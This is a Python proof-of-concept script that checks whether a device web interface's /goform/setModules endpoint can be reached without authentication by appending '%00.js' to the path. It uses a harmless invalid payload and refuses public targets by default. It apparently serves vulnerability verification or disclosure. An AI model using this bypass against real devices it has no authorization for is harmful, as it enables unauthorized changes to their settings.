#!/usr/bin/env python3
"""
PoC: unauthenticated access to /goform/setModules via %00 static-suffix bypass.

Uses an intentionally invalid module name to prove route reachability without
changing device settings.
"""

import argparse
import ipaddress
import json
import socket
import sys
import urllib.error
import urllib.parse
import urllib.request


def require_private_target(base_url, allow_nonlocal):
    host = urllib.parse.urlparse(base_url).hostname
    ip = ipaddress.ip_address(socket.gethostbyname(host))
    if not allow_nonlocal and not (ip.is_loopback or ip.is_private):
        raise SystemExit(f"refusing non-private target {ip}; pass --allow-nonlocal for authorized testing")


def post_json(base_url, path, payload):
    body = json.dumps(payload).encode()
    req = urllib.request.Request(
        base_url.rstrip("/") + path,
        data=body,
        method="POST",
        headers={"Content-Type": "application/json; charset=UTF-8"},
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            return resp.status, resp.read().decode(errors="replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode(errors="replace")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="http://127.0.0.1:18080")
    parser.add_argument("--allow-nonlocal", action="store_true")
    args = parser.parse_args()

    require_private_target(args.target, args.allow_nonlocal)
    payload = {"noSuchModule": "x"}
    baseline_status, baseline_body = post_json(args.target, "/goform/setModules", payload)
    bypass_status, bypass_body = post_json(args.target, "/goform/setModules%00.js", payload)

    vulnerable = baseline_status == 200 and '"errCode":1000' in baseline_body and bypass_status == 200 and '"errCode":""' in bypass_body
    print("[baseline] POST /goform/setModules " + json.dumps(payload))
    print(f"  status={baseline_status} body={baseline_body}")
    print("[exploit] POST /goform/setModules%00.js " + json.dumps(payload))
    print(f"  status={bypass_status} body={bypass_body}")
    print("  vulnerable=" + str(vulnerable))
    if vulnerable:
        print("  cvss evidence: AV:N/AC:L/PR:N/UI:N/I:H candidate; broad write API reachable without auth")
    sys.exit(0 if vulnerable else 1)


if __name__ == "__main__":
    main()

